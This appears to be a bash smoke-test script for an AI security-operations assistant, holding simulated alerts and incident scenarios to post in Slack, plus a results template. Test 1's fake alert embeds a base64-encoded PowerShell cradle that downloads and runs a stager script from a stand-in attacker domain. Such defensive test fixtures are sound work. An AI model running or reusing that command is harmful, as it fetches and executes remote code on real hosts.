#!/bin/bash
# run-frozen-ledger.sh — Execute Operation Frozen Ledger smoke tests
#
# Modes:
#   ./tests/run-frozen-ledger.sh              Print prompts for manual Slack testing
#   ./tests/run-frozen-ledger.sh --post       Post prompts to Slack via slack-notify.sh
#   ./tests/run-frozen-ledger.sh --log        Print prompts and create results template
#
# After running tests in Slack, use --log to create a results capture file.

set -uo pipefail

HOOK_DIR="$(cd "$(dirname "$0")/.." && pwd)"
SLACK_NOTIFY="$HOOK_DIR/scripts/lib/slack-notify.sh"
RESULTS_DIR="$HOOK_DIR/tests/results"
CHANNEL="${HOOK_SLACK_CHANNEL:-#hook}"
MODE="${1:-}"
TIMESTAMP=$(date -u '+%Y%m%d-%H%M%S')

# ── Test Prompts ──────────────────────────────────────────────────────

declare -a TEST_NAMES
declare -a TEST_AGENTS
declare -a TEST_PROMPTS
declare -a TEST_VALIDATIONS

TEST_NAMES[1]="Basic Triage"
TEST_AGENTS[1]="triage-analyst"
TEST_PROMPTS[1]='Triage this Sentinel alert:

AlertName: Suspicious PowerShell Command
Severity: High
TimeGenerated: 2026-02-27T14:23:15Z
CompromisedEntity: WKSTN-FIN-042
AlertType: VM_AmMalware
Entities:
  - Host: WKSTN-FIN-042 (10.20.30.42)
  - Account: jsmith@contoso.com
  - Process: powershell.exe -enc aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB1AHAAZABhAHQAZQAtAGMAaABlAGMAawAuAGYAaQBuAGEAbgBjAGUALQBwAG8AcgB0AGEAbAAuAGMAbwBtAC8AcwB0AGEAZwBlAHIALgBwAHMAMQAnACkA
  - FileHash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
  - IP: 45.77.65.211 (destination)'
TEST_VALIDATIONS[1]="Correct verdict (TP), base64 decode, ATT&CK mapping, routes to triage-analyst"

TEST_NAMES[2]="IOC Enrichment"
TEST_AGENTS[2]="osint-researcher"
TEST_PROMPTS[2]='Enrich the following IOCs from a suspected intrusion:
- IP: 45.77.65.211 (C2 callback destination)
- Domain: update-check.finance-portal.com (stager download)
- Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
Provide full enrichment from all available sources.'
TEST_VALIDATIONS[2]="VT + Censys + AbuseIPDB calls succeed, structured output, routes to osint-researcher"

TEST_NAMES[3]="Incident Response"
TEST_AGENTS[3]="incident-responder"
TEST_PROMPTS[3]='We have a confirmed intrusion on WKSTN-FIN-042 (10.20.30.42) in our finance department.
- Cobalt Strike beacon detected, beaconing to 45.77.65.211
- Credential dumping observed (Mimikatz signatures in memory)
- Lateral movement to DC-01 (10.20.30.10) via PsExec
- Environment: Microsoft Sentinel + Defender for Endpoint + Entra ID
- 500 employees, PCI-DSS compliant
What are the immediate containment and response steps?'
TEST_VALIDATIONS[3]="NIST 800-61 steps, platform-specific Defender/Sentinel guidance, routes to incident-responder"

TEST_NAMES[4]="Threat Intelligence"
TEST_AGENTS[4]="threat-intel"
TEST_PROMPTS[4]='Analyze the following attack chain and provide attribution assessment:
- Initial vector: Spearphishing to finance department
- Payload: Macro-enabled .docm -> PowerShell stager -> Cobalt Strike
- C2: HTTPS beacon to Vultr VPS (45.77.65.211)
- Post-exploitation: Mimikatz, PsExec lateral movement
- Objective: Ransomware (LockBit variant)
- Target: Financial services firm
Use ACH to assess likely threat groups.'
TEST_VALIDATIONS[4]="ACH matrix, attribution with confidence levels, routes to threat-intel"

TEST_NAMES[5]="Report Generation"
TEST_AGENTS[5]="report-writer"
TEST_PROMPTS[5]='Using the following findings, write an incident summary for the CISO:
- Incident: Ransomware attempt on Contoso Financial
- Timeline: Phishing email at 14:00 UTC -> Execution at 14:23 -> C2 at 14:25 -> Lateral movement at 15:10 -> Ransomware blocked at 15:45
- Impact: 1 workstation compromised, DC accessed, ransomware deployment blocked before encryption
- Response: Host isolated, credentials rotated, C2 blocked at firewall
- Status: Contained, eradication in progress'
TEST_VALIDATIONS[5]="CISO-appropriate language, no jargon, clear impact, routes to report-writer"

TEST_NAMES[6]="Full Chain"
TEST_AGENTS[6]="coordinator (multi-agent chain)"
TEST_PROMPTS[6]='We just got this Sentinel alert. Please investigate fully -- triage it, enrich all IOCs, give me IR guidance, and write a summary for management.

AlertName: Multi-stage Attack Detected
Severity: Critical
Entities:
  - Host: WKSTN-FIN-042 (10.20.30.42)
  - Account: jsmith@contoso.com
  - C2 IP: 45.77.65.211
  - Domain: update-check.finance-portal.com
  - Hash: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
  - Lateral Movement Target: DC-01 (10.20.30.10)'
TEST_VALIDATIONS[6]="Correct routing to multiple agents, chained workflow, context passed between agents"

# ── Functions ─────────────────────────────────────────────────────────

print_test() {
    local num=$1
    echo ""
    echo "================================================================"
    echo "TEST $num: ${TEST_NAMES[$num]}"
    echo "Expected agent: ${TEST_AGENTS[$num]}"
    echo "Validation: ${TEST_VALIDATIONS[$num]}"
    echo "================================================================"
    echo ""
    echo "${TEST_PROMPTS[$num]}"
    echo ""
}

post_test() {
    local num=$1
    if [ ! -x "$SLACK_NOTIFY" ]; then
        echo "[FAIL] slack-notify.sh not found or not executable"
        echo "       Expected: $SLACK_NOTIFY"
        return 1
    fi
    echo "[POST] Test $num: ${TEST_NAMES[$num]} -> $CHANNEL"
    echo "${TEST_PROMPTS[$num]}" | "$SLACK_NOTIFY" "$CHANNEL"
    echo "[OK]   Posted. Wait for agent response before proceeding."
    echo ""
}

create_results_template() {
    mkdir -p "$RESULTS_DIR"
    local RESULTS_FILE="$RESULTS_DIR/frozen-ledger-$TIMESTAMP.md"

    cat > "$RESULTS_FILE" <<RESULTS_EOF
# Operation Frozen Ledger -- Test Results

**Date:** $(date -u '+%Y-%m-%d %H:%M UTC')
**Channel:** $CHANNEL
**Gateway:** $(openclaw gateway status 2>/dev/null | head -1 || echo "unknown")

## Results

### Test 1: Basic Triage
- **Expected agent:** triage-analyst
- **Routed to:** _____________
- **Verdict correct:** [ ] Yes  [ ] No
- **Base64 decoded:** [ ] Yes  [ ] No
- **ATT&CK mapping:** [ ] Yes  [ ] No
- **Response time:** ___s
- **Notes:**


### Test 2: IOC Enrichment
- **Expected agent:** osint-researcher
- **Routed to:** _____________
- **VT call succeeded:** [ ] Yes  [ ] No  [ ] Rate limited
- **Censys call succeeded:** [ ] Yes  [ ] No
- **AbuseIPDB call succeeded:** [ ] Yes  [ ] No
- **Structured output:** [ ] Yes  [ ] No
- **Response time:** ___s
- **Notes:**


### Test 3: Incident Response
- **Expected agent:** incident-responder
- **Routed to:** _____________
- **NIST 800-61 framework:** [ ] Yes  [ ] No
- **Platform-specific guidance:** [ ] Yes  [ ] No
- **PCI-DSS considered:** [ ] Yes  [ ] No
- **Response time:** ___s
- **Notes:**


### Test 4: Threat Intelligence
- **Expected agent:** threat-intel
- **Routed to:** _____________
- **ACH matrix present:** [ ] Yes  [ ] No
- **Attribution assessment:** [ ] Yes  [ ] No
- **Confidence levels stated:** [ ] Yes  [ ] No
- **Response time:** ___s
- **Notes:**


### Test 5: Report Generation
- **Expected agent:** report-writer
- **Routed to:** _____________
- **CISO-appropriate tone:** [ ] Yes  [ ] No
- **Jargon-free:** [ ] Yes  [ ] No
- **Impact clear:** [ ] Yes  [ ] No
- **Response time:** ___s
- **Notes:**


### Test 6: Full Chain
- **Expected routing:** coordinator -> triage -> osint -> IR/report
- **Actual routing:** _____________
- **Context passed between agents:** [ ] Yes  [ ] No
- **All specialists invoked:** [ ] Yes  [ ] No
- **Final summary produced:** [ ] Yes  [ ] No
- **Total response time:** ___s
- **Notes:**


## Summary

| Test | Routing | Quality | Time | Status |
|------|---------|---------|------|--------|
| 1. Triage       | /6 | /3 | ___s | |
| 2. Enrichment   | /6 | /3 | ___s | |
| 3. IR           | /6 | /3 | ___s | |
| 4. Threat Intel | /6 | /3 | ___s | |
| 5. Report       | /6 | /3 | ___s | |
| 6. Full Chain   | /6 | /3 | ___s | |

**Overall:** ___/6 passing

## Issues Found

1.
2.
3.

## Agent Tuning Needed

1.
2.
3.
RESULTS_EOF

    echo "[OK] Results template created: $RESULTS_FILE"
    echo "     Fill in after running tests in Slack."
}

# ── Main ──────────────────────────────────────────────────────────────

echo ""
echo "Operation Frozen Ledger -- HOOK Smoke Test"
echo "  $(date -u '+%Y-%m-%d %H:%M UTC')"
echo "  Channel: $CHANNEL"
echo ""

case "$MODE" in
    --post)
        echo "Mode: POST (sending prompts to Slack)"
        echo ""
        echo "WARNING: This will post 6 test prompts to $CHANNEL."
        echo "Each test should complete before the next is posted."
        echo "Tests 1-5 are independent. Test 6 is the full chain."
        echo ""
        read -rp "Continue? [y/N]: " CONFIRM
        if [ "${CONFIRM:-N}" != "y" ] && [ "${CONFIRM:-N}" != "Y" ]; then
            echo "Aborted."
            exit 0
        fi
        echo ""
        for i in 1 2 3 4 5 6; do
            post_test $i
            if [ $i -lt 6 ]; then
                read -rp "Press Enter when Test $i response is complete..." _
            fi
        done
        echo ""
        echo "All tests posted. Creating results template..."
        create_results_template
        ;;
    --log)
        echo "Mode: LOG (creating results template only)"
        create_results_template
        ;;
    *)
        echo "Mode: PRINT (copy prompts manually to Slack)"
        echo ""
        echo "Instructions:"
        echo "  1. Ensure gateway is running: openclaw gateway status"
        echo "  2. Open Slack channel $CHANNEL"
        echo "  3. Post each prompt as @HOOK [prompt]"
        echo "  4. Wait for response before posting the next test"
        echo "  5. After all tests, run: $0 --log"
        for i in 1 2 3 4 5 6; do
            print_test $i
        done
        echo "================================================================"
        echo ""
        echo "After running all tests in Slack:"
        echo "  $0 --log    Create results capture template"
        echo ""
        ;;
esac
